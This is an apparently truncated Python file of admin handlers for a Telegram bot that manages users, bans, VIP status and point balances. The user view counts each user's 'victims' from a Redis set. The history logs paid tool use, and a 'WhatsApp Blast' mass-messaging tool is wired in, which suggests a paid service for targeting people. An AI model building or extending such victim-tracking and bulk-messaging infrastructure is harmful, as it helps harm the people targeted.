# bot_handlers/callbacks/admin.py
# ============================================================
# ★ معالجات الأدمن — v8.0 (كل الأزرار شغالة)
# ============================================================

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

from config import bot, redis_client
from imports_manager import (
    is_admin,
    build_admin_menu,
    build_admin_users_keyboard,
    build_user_detail_keyboard,
    build_user_info_text,
    build_admin_stats_text,
    get_all_users,
    get_user,
    get_or_create_user,
    save_user,
    ban_user, unban_user, delete_user,
    activate_subscription,
    PRICING_PLANS,
    add_points,
    remove_points,
    set_points,
)
from logging_config import get_logger

from ..helpers import safe_edit, h

logger = get_logger("bot_handlers.callbacks.admin")


# ============================================================
# [1] المعالج الرئيسي
# ============================================================
def handle(call, chat_id, user_id, data):
    """الموزّع الرئيسي لكل admin_*"""

    # ⚡ الرد الفوري (تجنب timeout)
    try:
        bot.answer_callback_query(call.id)
    except Exception:
        pass

    # حماية عامة
    if not is_admin(user_id):
        try:
            bot.answer_callback_query(call.id, "❌ للأدمن فقط", show_alert=True)
        except Exception:
            pass
        return

    # ══════════════════════════════════════════════════
    # 📊 قائمة المستخدمين
    # ══════════════════════════════════════════════════
    if data.startswith("admin_users_"):
        _handle_users_list(call, data)
        return

    # ══════════════════════════════════════════════════
    # 👤 تفاصيل مستخدم
    # ══════════════════════════════════════════════════
    if data.startswith("admin_user_") and not data.startswith("admin_users_"):
        _handle_user_detail(call, data)
        return

    # ══════════════════════════════════════════════════
    # 💰 إدارة النقاط
    # ══════════════════════════════════════════════════
    if data.startswith("admin_points_menu_"):
        _handle_points_menu(call, data)
        return

    if data.startswith("admin_add_points_"):
        _handle_add_points(call, data)
        return

    if data.startswith("admin_rem_points_"):
        _handle_remove_points(call, data)
        return

    if data.startswith("admin_set_points_"):
        _handle_set_points(call, data)
        return

    if data.startswith("admin_do_add_"):
        _handle_do_add_points(call, data)
        return

    if data.startswith("admin_do_rem_"):
        _handle_do_remove_points(call, data)
        return

    if data.startswith("admin_do_set_"):
        _handle_do_set_points(call, data)
        return

    if data.startswith("admin_custom_add_"):
        _handle_custom_add(call, chat_id, data)
        return

    if data.startswith("admin_custom_rem_"):
        _handle_custom_rem(call, chat_id, data)
        return

    if data.startswith("admin_custom_set_"):
        _handle_custom_set(call, chat_id, data)
        return

    if data.startswith("admin_points_history_"):
        _handle_points_history(call, data)
        return

    # ══════════════════════════════════════════════════
    # 👑 إدارة الحساب
    # ══════════════════════════════════════════════════
    if data.startswith("admin_ban_user_"):
        _handle_ban(call, data)
        return

    if data.startswith("admin_unban_user_"):
        _handle_unban(call, data)
        return

    if data.startswith("admin_grant_vip_user_"):
        _handle_grant_vip(call, data)
        return

    if data.startswith("admin_remove_vip_"):
        _handle_remove_vip(call, data)
        return

    if data.startswith("admin_delete_user_"):
        _handle_delete(call, data)
        return

    if data.startswith("admin_msg_user_"):
        _handle_msg_user(call, chat_id, data)
        return

    # ══════════════════════════════════════════════════
    # 💎 إعطاء نجوم (جديد)
    # ══════════════════════════════════════════════════
    if data == "admin_give_stars":
        _handle_give_stars_prompt(call, chat_id)
        return

    if data.startswith("admin_stars_amount_"):
        _handle_stars_amount(call, chat_id, data)
        return

    if data.startswith("admin_do_stars_"):
        _handle_do_stars(call, chat_id, data)
        return

    # ══════════════════════════════════════════════════
    # 💎 الاشتراكات (Legacy)
    # ══════════════════════════════════════════════════
    if data.startswith("admin_give_sub_"):
        _handle_give_sub_prompt(call, data)
        return

    if data.startswith("admin_activate_"):
        _handle_activate_sub(call, data)
        return

    # ══════════════════════════════════════════════════
    # ⚙️ أدوات إدارية
    # ══════════════════════════════════════════════════
    if data == "admin_panel":
        _handle_panel(call)
        return

    if data == "admin_stats":
        _handle_stats(call)
        return

    if data == "admin_recent":
        _handle_recent(call)
        return

    if data == "admin_search":
        _handle_search(call, chat_id)
        return

    if data == "admin_broadcast":
        _handle_broadcast(call, chat_id)
        return

    # ⚙️ إدارة التحديثات
    if data == "admin_updates":
        _handle_updates(call)
        return

    # ⚙️ الإعدادات
    if data == "admin_settings":
        _handle_settings(call)
        return

    # 🛠️ الصيانة
    if data in ("admin_maintenance_on", "admin_maintenance_off"):
        try:
            bot.answer_callback_query(call.id, "⚠️ نظام الصيانة معطّل حالياً", show_alert=True)
        except Exception:
            pass
        return

    # 🔴 المراقبة المباشرة
    if data == "admin_live":
        _handle_live(call)
        return

    # 📊 إحصائيات حية
    if data == "admin_adv_stats":
        _handle_adv_stats(call)
        return

    # 📈 تحليلات
    if data == "admin_analytics":
        _handle_analytics(call)
        return

    # 👑 أكثر المستخدمين
    if data == "admin_top_users":
        _handle_top_users(call)
        return

    # 📋 سجل الأحداث
    if data == "admin_events":
        _handle_events(call)
        return

    # 📡 سجل الأنشطة
    if data == "admin_activity_log":
        _handle_activity_log(call)
        return

    # 🧹 تنظيف Redis
    if data == "admin_clean_redis":
        _handle_clean_redis(call)
        return

    # 📥 تصدير
    if data == "admin_export":
        _handle_export(call, chat_id)
        return

    # 📢 رسالة جماعية
    if data == "admin_broadcast":
        _handle_broadcast(call, chat_id)
        return

    # ══════════════════════════════════════════════════
    # WhatsApp Blast
    # ══════════════════════════════════════════════════
    if data == "admin_wb_menu" or data.startswith("wbr_"):
        try:
            from admin_tools.whatsapp_blast.bot_handlers_real import handle_wb_callback
            handle_wb_callback(call, chat_id, user_id, data)
        except Exception as e:
            logger.exception(f"[admin] WB handler failed: {e}")
        return

    # غير معروف
    logger.warning(f"Unknown admin callback: {data}")


# ============================================================
# [2] 👥 قائمة المستخدمين
# ============================================================
def _handle_users_list(call, data):
    try:
        page = int(data.replace("admin_users_", ""))
    except ValueError:
        page = 0

    try:
        users = get_all_users()
    except Exception as e:
        logger.exception(f"get_all_users failed: {e}")
        users = []

    if not users:
        safe_edit(
            call,
            "👥 <b>قائمة المستخدمين</b>\n\n📭 لا يوجد مستخدمون بعد",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
            )
        )
        return

    users.sort(key=lambda u: str(u.get("created_at", "")), reverse=True)

    try:
        keyboard = build_admin_users_keyboard(users, page=page)
    except Exception as e:
        logger.exception(f"build_admin_users_keyboard failed: {e}")
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")
        )

    total_pages = max(1, (len(users) + 9) // 10)
    text = (
        f"👥 <b>قائمة المستخدمين</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 <b>الإجمالي:</b> <code>{len(users)}</code>\n"
        f"📄 <b>الصفحة:</b> <code>{page + 1}/{total_pages}</code>"
    )
    safe_edit(call, text, reply_markup=keyboard)


# ============================================================
# [3] 👤 تفاصيل مستخدم
# ============================================================
def _handle_user_detail(call, data):
    try:
        uid = int(data.replace("admin_user_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        safe_edit(
            call,
            f"❌ <b>المستخدم غير موجود</b>\n\nID: <code>{uid}</code>",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 قائمة المستخدمين", callback_data="admin_users_0")
            )
        )
        return

    text = _build_user_detail_text(uid, user)
    m = _build_user_detail_keyboard_v2(uid, user)

    safe_edit(call, text, reply_markup=m)


def _build_user_detail_text(uid, user):
    """يبني رسالة تفاصيل المستخدم"""
    first_name = user.get("first_name", "Unknown")
    username = user.get("username", "")

    if is_admin(uid):
        status = "👑 أدمن"
    elif user.get("is_banned"):
        status = "🚫 محظور"
    elif user.get("is_vip"):
        status = "💎 VIP"
    else:
        status = "👤 مستخدم عادي"

    points = user.get("points", 0)
    total_earned = user.get("total_points_earned", 0)
    total_spent = user.get("total_points_spent", 0)

    ref_count = user.get("referral_count", 0)
    ref_code = user.get("ref_code", "—")

    created_at = str(user.get("created_at", ""))[:19].replace("T", " ")

    victims_count = 0
    try:
        if redis_client:
            vids = redis_client.smembers(f"victims:{uid}") or set()
            victims_count = len(vids)
    except Exception:
        pass

    text = (
        f"👤 <b>معلومات المستخدم</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"👋 <b>الاسم:</b> {h(first_name)}\n"
    )

    if username and username != "Unknown":
        text += f"📝 <b>Username:</b> @{h(username)}\n"

    text += (
        f"📊 <b>الحالة:</b> {status}\n"
        f"📅 <b>التسجيل:</b> <code>{created_at}</code>\n\n"
        f"━━━ 💰 ━━━ <b>النقاط</b>\n"
        f"💰 <b>الرصيد الحالي:</b> <code>{points}</code> نقطة\n"
        f"📈 <b>إجمالي مكتسب:</b> <code>{total_earned}</code>\n"
        f"📉 <b>إجمالي مصروف:</b> <code>{total_spent}</code>\n\n"
        f"━━━ 🎁 ━━━ <b>الإحالات</b>\n"
        f"👥 <b>عدد الإحالات:</b> <code>{ref_count}</code>\n"
        f"🔗 <b>الكود:</b> <code>{ref_code}</code>\n\n"
        f"━━━ 🎯 ━━━ <b>الضحايا</b>\n"
        f"📱 <b>عدد الضحايا:</b> <code>{victims_count}</code>\n"
    )

    return text


def _build_user_detail_keyboard_v2(uid, user):
    """يبني أزرار تفاصيل المستخدم"""
    m = InlineKeyboardMarkup()

    # حالة الحساب
    if user.get("is_banned"):
        m.row(
            InlineKeyboardButton("✅ فك الحظر", callback_data=f"admin_unban_user_{uid}"),
            InlineKeyboardButton("🗑️ حذف", callback_data=f"admin_delete_user_{uid}"),
        )
    else:
        m.row(
            InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_user_{uid}"),
            InlineKeyboardButton("🗑️ حذف", callback_data=f"admin_delete_user_{uid}"),
        )

    # VIP
    if user.get("is_vip"):
        m.row(
            InlineKeyboardButton("❌ إزالة VIP", callback_data=f"admin_remove_vip_{uid}"),
        )
    else:
        m.row(
            InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"),
        )

    # إدارة النقاط
    m.add(InlineKeyboardButton(
        "💰 إدارة النقاط",
        callback_data=f"admin_points_menu_{uid}"
    ))

    # إعطاء نجوم
    m.add(InlineKeyboardButton(
        "⭐ إعطاء نجوم",
        callback_data=f"admin_stars_amount_{uid}"
    ))

    # رسالة + تحديث
    m.row(
        InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
        InlineKeyboardButton("🔄 تحديث", callback_data=f"admin_user_{uid}"),
    )

    # رجوع
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="admin_users_0"))

    return m


# ============================================================
# [4] 💰 إدارة النقاط
# ============================================================
def _handle_points_menu(call, data):
    try:
        uid = int(data.replace("admin_points_menu_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    points = user.get("points", 0)
    first_name = user.get("first_name", "Unknown")

    text = (
        f"💰 <b>إدارة النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(first_name)}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n"
        f"💎 <b>الرصيد الحالي:</b> <code>{points}</code> نقطة\n\n"
        f"🎯 <b>اختر العملية:</b>"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("➕ إضافة نقاط", callback_data=f"admin_add_points_{uid}"))
    m.add(InlineKeyboardButton("➖ خصم نقاط", callback_data=f"admin_rem_points_{uid}"))
    m.add(InlineKeyboardButton("⚙️ تعيين نقاط", callback_data=f"admin_set_points_{uid}"))
    m.add(InlineKeyboardButton("📋 سجل المعاملات", callback_data=f"admin_points_history_{uid}"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))

    safe_edit(call, text, reply_markup=m)


def _handle_add_points(call, data):
    try:
        uid = int(data.replace("admin_add_points_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        return

    points = user.get("points", 0)
    first_name = user.get("first_name", "Unknown")

    text = (
        f"➕ <b>إضافة نقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(first_name)}\n"
        f"💎 <b>الرصيد الحالي:</b> <code>{points}</code> نقطة\n\n"
        f"🎯 <b>اختر المبلغ:</b>"
    )

    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("+5", callback_data=f"admin_do_add_{uid}_5"),
        InlineKeyboardButton("+10", callback_data=f"admin_do_add_{uid}_10"),
        InlineKeyboardButton("+25", callback_data=f"admin_do_add_{uid}_25"),
    )
    m.row(
        InlineKeyboardButton("+50", callback_data=f"admin_do_add_{uid}_50"),
        InlineKeyboardButton("+100", callback_data=f"admin_do_add_{uid}_100"),
        InlineKeyboardButton("+250", callback_data=f"admin_do_add_{uid}_250"),
    )
    m.row(
        InlineKeyboardButton("+500", callback_data=f"admin_do_add_{uid}_500"),
        InlineKeyboardButton("+1000", callback_data=f"admin_do_add_{uid}_1000"),
    )
    m.add(InlineKeyboardButton("✏️ مبلغ مخصص", callback_data=f"admin_custom_add_{uid}"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_points_menu_{uid}"))

    safe_edit(call, text, reply_markup=m)


def _handle_do_add_points(call, data):
    try:
        parts = data.replace("admin_do_add_", "").rsplit("_", 1)
        uid = int(parts[0])
        amount = int(parts[1])
    except (ValueError, IndexError):
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    old_points = user.get("points", 0)

    try:
        add_points(uid, amount, reason="منحة من الأدمن", admin_action=True)
    except Exception as e:
        logger.exception(f"add_points failed: {e}")
        safe_edit(call, f"❌ فشل: {h(str(e)[:200])}")
        return

    user = get_user(uid)
    new_points = user.get("points", 0)

    text = (
        f"✅ <b>تم إضافة النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"➕ <b>تم إضافة:</b> <code>+{amount}</code> نقطة\n"
        f"📊 <b>الرصيد السابق:</b> <code>{old_points}</code>\n"
        f"💎 <b>الرصيد الجديد:</b> <code>{new_points}</code>\n\n"
        f"✅ <b>العملية تمت بنجاح</b>"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
    m.row(
        InlineKeyboardButton("➕ إضافة تاني", callback_data=f"admin_add_points_{uid}"),
        InlineKeyboardButton("👤 المستخدم", callback_data=f"admin_user_{uid}"),
    )

    safe_edit(call, text, reply_markup=m)

    try:
        bot.send_message(
            uid,
            f"🎉 <b>تم إضافة نقاط لحسابك!</b>\n\n"
            f"➕ <b>+{amount}</b> نقطة\n"
            f"💎 <b>رصيدك الجديد:</b> <code>{new_points}</code> نقطة\n\n"
            f"شكراً لاستخدامك البوت 🙏",
            parse_mode="HTML"
        )
    except Exception:
        pass

    logger.info(f"[ADMIN] {call.from_user.id} added +{amount} points to {uid}")


def _handle_remove_points(call, data):
    try:
        uid = int(data.replace("admin_rem_points_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        return

    points = user.get("points", 0)
    first_name = user.get("first_name", "Unknown")

    text = (
        f"➖ <b>خصم نقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(first_name)}\n"
        f"💎 <b>الرصيد الحالي:</b> <code>{points}</code> نقطة\n\n"
        f"🎯 <b>اختر المبلغ:</b>"
    )

    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("-5", callback_data=f"admin_do_rem_{uid}_5"),
        InlineKeyboardButton("-10", callback_data=f"admin_do_rem_{uid}_10"),
        InlineKeyboardButton("-25", callback_data=f"admin_do_rem_{uid}_25"),
    )
    m.row(
        InlineKeyboardButton("-50", callback_data=f"admin_do_rem_{uid}_50"),
        InlineKeyboardButton("-100", callback_data=f"admin_do_rem_{uid}_100"),
        InlineKeyboardButton("-250", callback_data=f"admin_do_rem_{uid}_250"),
    )
    m.row(
        InlineKeyboardButton("-500", callback_data=f"admin_do_rem_{uid}_500"),
        InlineKeyboardButton("-1000", callback_data=f"admin_do_rem_{uid}_1000"),
    )
    m.add(InlineKeyboardButton("✏️ مبلغ مخصص", callback_data=f"admin_custom_rem_{uid}"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_points_menu_{uid}"))

    safe_edit(call, text, reply_markup=m)


def _handle_do_remove_points(call, data):
    try:
        parts = data.replace("admin_do_rem_", "").rsplit("_", 1)
        uid = int(parts[0])
        amount = int(parts[1])
    except (ValueError, IndexError):
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    old_points = user.get("points", 0)

    try:
        remove_points(uid, amount, reason="خصم من الأدمن")
    except Exception as e:
        logger.exception(f"remove_points failed: {e}")
        safe_edit(call, f"❌ فشل: {h(str(e)[:200])}")
        return

    user = get_user(uid)
    new_points = user.get("points", 0)

    text = (
        f"✅ <b>تم خصم النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"➖ <b>تم خصم:</b> <code>-{amount}</code> نقطة\n"
        f"📊 <b>الرصيد السابق:</b> <code>{old_points}</code>\n"
        f"💎 <b>الرصيد الجديد:</b> <code>{new_points}</code>\n\n"
        f"✅ <b>العملية تمت بنجاح</b>"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
    m.row(
        InlineKeyboardButton("➖ خصم تاني", callback_data=f"admin_rem_points_{uid}"),
        InlineKeyboardButton("👤 المستخدم", callback_data=f"admin_user_{uid}"),
    )

    safe_edit(call, text, reply_markup=m)

    try:
        bot.send_message(
            uid,
            f"⚠️ <b>تم خصم نقاط من حسابك</b>\n\n"
            f"➖ <b>-{amount}</b> نقطة\n"
            f"💎 <b>رصيدك الحالي:</b> <code>{new_points}</code> نقطة",
            parse_mode="HTML"
        )
    except Exception:
        pass

    logger.info(f"[ADMIN] {call.from_user.id} removed -{amount} points from {uid}")


def _handle_set_points(call, data):
    try:
        uid = int(data.replace("admin_set_points_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        return

    points = user.get("points", 0)
    first_name = user.get("first_name", "Unknown")

    text = (
        f"⚙️ <b>تعيين نقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(first_name)}\n"
        f"💎 <b>الرصيد الحالي:</b> <code>{points}</code> نقطة\n\n"
        f"⚠️ <b>ملاحظة:</b> التعيين يُلغي الرصيد الحالي\n"
        f"ويحط القيمة الجديدة بدلاً منه\n\n"
        f"🎯 <b>اختر القيمة الجديدة:</b>"
    )

    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("0", callback_data=f"admin_do_set_{uid}_0"),
        InlineKeyboardButton("10", callback_data=f"admin_do_set_{uid}_10"),
        InlineKeyboardButton("25", callback_data=f"admin_do_set_{uid}_25"),
    )
    m.row(
        InlineKeyboardButton("50", callback_data=f"admin_do_set_{uid}_50"),
        InlineKeyboardButton("100", callback_data=f"admin_do_set_{uid}_100"),
        InlineKeyboardButton("500", callback_data=f"admin_do_set_{uid}_500"),
    )
    m.add(InlineKeyboardButton("✏️ قيمة مخصصة", callback_data=f"admin_custom_set_{uid}"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_points_menu_{uid}"))

    safe_edit(call, text, reply_markup=m)


def _handle_do_set_points(call, data):
    try:
        parts = data.replace("admin_do_set_", "").rsplit("_", 1)
        uid = int(parts[0])
        amount = int(parts[1])
    except (ValueError, IndexError):
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    old_points = user.get("points", 0)

    try:
        set_points(uid, amount, reason="تعيين من الأدمن")
    except Exception as e:
        logger.exception(f"set_points failed: {e}")
        safe_edit(call, f"❌ فشل: {h(str(e)[:200])}")
        return

    user = get_user(uid)
    new_points = user.get("points", 0)

    text = (
        f"✅ <b>تم تعيين النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"⚙️ <b>الرصيد السابق:</b> <code>{old_points}</code>\n"
        f"💎 <b>الرصيد الجديد:</b> <code>{new_points}</code>\n\n"
        f"✅ <b>العملية تمت بنجاح</b>"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
    m.row(
        InlineKeyboardButton("⚙️ تعيين تاني", callback_data=f"admin_set_points_{uid}"),
        InlineKeyboardButton("👤 المستخدم", callback_data=f"admin_user_{uid}"),
    )

    safe_edit(call, text, reply_markup=m)

    try:
        bot.send_message(
            uid,
            f"⚙️ <b>تم تحديث رصيدك</b>\n\n"
            f"💎 <b>رصيدك الجديد:</b> <code>{new_points}</code> نقطة",
            parse_mode="HTML"
        )
    except Exception:
        pass

    logger.info(f"[ADMIN] {call.from_user.id} set points for {uid} to {amount}")


def _handle_custom_add(call, chat_id, data):
    try:
        uid = int(data.replace("admin_custom_add_", ""))
    except ValueError:
        return

    msg = bot.send_message(
        chat_id,
        f"✏️ <b>أرسل المبلغ المخصص للإضافة</b>\n\n"
        f"📝 مثال: <code>75</code>\n"
        f"⚠️ أرقام فقط",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, lambda m: _process_custom_amount(m, uid, "add"))


def _handle_custom_rem(call, chat_id, data):
    try:
        uid = int(data.replace("admin_custom_rem_", ""))
    except ValueError:
        return

    msg = bot.send_message(
        chat_id,
        f"✏️ <b>أرسل المبلغ المخصص للخصم</b>\n\n"
        f"📝 مثال: <code>75</code>\n"
        f"⚠️ أرقام فقط",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, lambda m: _process_custom_amount(m, uid, "rem"))


def _handle_custom_set(call, chat_id, data):
    try:
        uid = int(data.replace("admin_custom_set_", ""))
    except ValueError:
        return

    msg = bot.send_message(
        chat_id,
        f"✏️ <b>أرسل القيمة المخصصة للتعيين</b>\n\n"
        f"📝 مثال: <code>75</code>\n"
        f"⚠️ أرقام فقط",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, lambda m: _process_custom_amount(m, uid, "set"))


def _process_custom_amount(message, uid, action):
    """يعالج المبلغ المخصص"""
    chat_id = message.chat.id

    if not is_admin(chat_id):
        return

    if not message.text:
        return

    text = message.text.strip()
    if not text.isdigit():
        bot.send_message(chat_id, "❌ لازم رقم صحيح")
        return

    amount = int(text)
    if amount < 0 or amount > 1000000:
        bot.send_message(chat_id, "❌ المبلغ غير منطقي (0 - 1,000,000)")
        return

    user = get_user(uid)
    if not user:
        bot.send_message(chat_id, "❌ المستخدم غير موجود")
        return

    old_points = user.get("points", 0)

    try:
        if action == "add":
            add_points(uid, amount, reason="منحة من الأدمن", admin_action=True)
            emoji, verb = "➕", "إضافة"
        elif action == "rem":
            remove_points(uid, amount, reason="خصم من الأدمن")
            emoji, verb = "➖", "خصم"
        else:
            set_points(uid, amount, reason="تعيين من الأدمن")
            emoji, verb = "⚙️", "تعيين"
    except Exception as e:
        logger.exception(f"custom action failed: {e}")
        bot.send_message(chat_id, f"❌ فشل: {h(str(e)[:200])}")
        return

    user = get_user(uid)
    new_points = user.get("points", 0)

    result_text = (
        f"✅ <b>تم {verb} النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"{emoji} <b>{verb}:</b> <code>{amount}</code> نقطة\n"
        f"📊 <b>الرصيد السابق:</b> <code>{old_points}</code>\n"
        f"💎 <b>الرصيد الجديد:</b> <code>{new_points}</code>\n"
    )

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
    m.add(InlineKeyboardButton("👤 المستخدم", callback_data=f"admin_user_{uid}"))

    try:
        bot.send_message(chat_id, result_text, parse_mode="HTML", reply_markup=m)
    except Exception:
        pass

    try:
        if action == "add":
            msg_text = f"🎉 <b>تم إضافة نقاط!</b>\n\n➕ <b>+{amount}</b> نقطة\n💎 رصيدك: <code>{new_points}</code>"
        elif action == "rem":
            msg_text = f"⚠️ <b>تم خصم نقاط</b>\n\n➖ <b>-{amount}</b> نقطة\n💎 رصيدك: <code>{new_points}</code>"
        else:
            msg_text = f"⚙️ <b>تم تحديث رصيدك</b>\n\n💎 رصيدك الجديد: <code>{new_points}</code>"

        bot.send_message(uid, msg_text, parse_mode="HTML")
    except Exception:
        pass

    logger.info(f"[ADMIN] {chat_id} {action} {amount} points for {uid}")


def _handle_points_history(call, data):
    try:
        uid = int(data.replace("admin_points_history_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        return

    history = user.get("history", [])[-20:]

    if not history:
        text = (
            f"📋 <b>سجل المعاملات</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n\n"
            f"📭 <i>لا يوجد معاملات بعد</i>"
        )
    else:
        text = (
            f"📋 <b>سجل المعاملات</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"👤 <b>المستخدم:</b> {h(user.get('first_name', 'Unknown'))}\n"
            f"📊 <b>عدد المعاملات:</b> {len(history)}\n\n"
        )

        for i, item in enumerate(reversed(history), 1):
            h_type = item.get("type", "")
            date_str = str(item.get("date", ""))[:19].replace("T", " ")
            points = item.get("points", 0)

            if h_type == "tool_used":
                name = item.get("tool_name", "أداة")
                text += f"{i}. 🔧 <b>{h(name)}</b>\n"
                text += f"   <code>-{item.get('cost', 0)}</code> • {date_str}\n"
            elif h_type == "referral":
                name = item.get("user_name", "Unknown")
                text += f"{i}. 🎁 <b>إحالة</b> - {h(name)}\n"
                text += f"   <code>+{points}</code> • {date_str}\n"
            elif h_type == "referral_bonus":
                count = item.get("count", 0)
                text += f"{i}. 🏆 <b>مكافأة {count} إحالات</b>\n"
                text += f"   <code>+{points}</code> • {date_str}\n"
            elif h_type == "add_points":
                reason = item.get("reason", "منحة")
                text += f"{i}. ➕ <b>{h(reason)}</b>\n"
                text += f"   <code>+{points}</code> • {date_str}\n"
            elif h_type == "remove_points":
                reason = item.get("reason", "خصم")
                text += f"{i}. ➖ <b>{h(reason)}</b>\n"
                text += f"   <code>{points}</code> • {date_str}\n"
            elif h_type == "set_points":
                text += f"{i}. ⚙️ <b>تعيين رصيد</b>\n"
                text += f"   <code>{item.get('old', 0)} → {item.get('new', 0)}</code> • {date_str}\n"
            else:
                text += f"{i}. 📌 <b>{h(h_type)}</b>\n"
                text += f"   <code>{points}</code> • {date_str}\n"
            text += "\n"

    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 إدارة النقاط", callback_data=f"admin_points_menu_{uid}"))
    m.add(InlineKeyboardButton("🔙 رجوع", callback_data=f"admin_user_{uid}"))

    safe_edit(call, text, reply_markup=m)


# ============================================================
# [5] ⭐ إعطاء نجوم (جديد)
# ============================================================
def _handle_give_stars_prompt(call, chat_id):
    """يطلب المستخدم والنجوم"""
    msg = bot.send_message(
        chat_id,
        f"⭐ <b>إعطاء نجوم</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 <b>أرسل بصيغة:</b>\n"
        f"<code>user_id|amount</code>\n\n"
        f"<b>مثال:</b>\n"
        f"<code>123456789|50</code>",
        parse_mode="HTML"
    )
    bot.register_next_step_handler(msg, _process_give_stars)


def _process_give_stars(message):
    """يعالج إعطاء النجوم"""
    chat_id = message.chat.id

    if not is_admin(chat_id):
        return

    if not message.text:
        return

    try:
        parts = message.text.strip().split("|")
        if len(parts) != 2:
            raise ValueError("wrong format")

        uid = int(parts[0].strip())
        amount = int(parts[1].strip())
    except (ValueError, IndexError):
        bot.send_message(
            chat_id,
            "❌ <b>صيغة غلط!</b>\n\n"
            "استخدم: <code>user_id|amount</code>",
            parse_mode="HTML"
        )
        return

    user = get_user(uid)
    if not user:
        bot.send_message(chat_id, "❌ المستخدم غير موجود")
        return

    # سجل في DB
    try:
        from database import log_admin_action_db
        log_admin_action_db(
            admin_id=chat_id,
            target_id=uid,
            action="give_stars",
            amount=amount,
            reason="منحة نجوم من الأدمن"
        )
    except Exception as e:
        logger.warning(f"log_admin_action_db error: {e}")

    bot.send_message(
        chat_id,
        f"✅ <b>تم إعطاء النجوم</b>\n\n"
        f"👤 المستخدم: <code>{uid}</code>\n"
        f"⭐ عدد النجوم: <code>{amount}</code>",
        parse_mode="HTML"
    )

    logger.info(f"[ADMIN] {chat_id} gave {amount} stars to {uid}")


def _handle_stars_amount(call, chat_id, data):
    """يعرض خيارات النجوم"""
    try:
        uid = int(data.replace("admin_stars_amount_", ""))
    except ValueError:
        return

    user = get_user(uid)
    if not user:
        safe_edit(call, "❌ المستخدم غير موجود")
        return

    first_name = user.get("first_name", "Unknown")

    text = (
        f"⭐ <b>إعطاء نجوم</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>المستخدم:</b> {h(first_name)}\n"
        f"🆔 <b>ID:</b> <code>{uid}</code>\n\n"
        f"🎯 <b>اختر عدد النجوم:</b>"
    )

    m = InlineKeyboardMarkup()
    m.row(
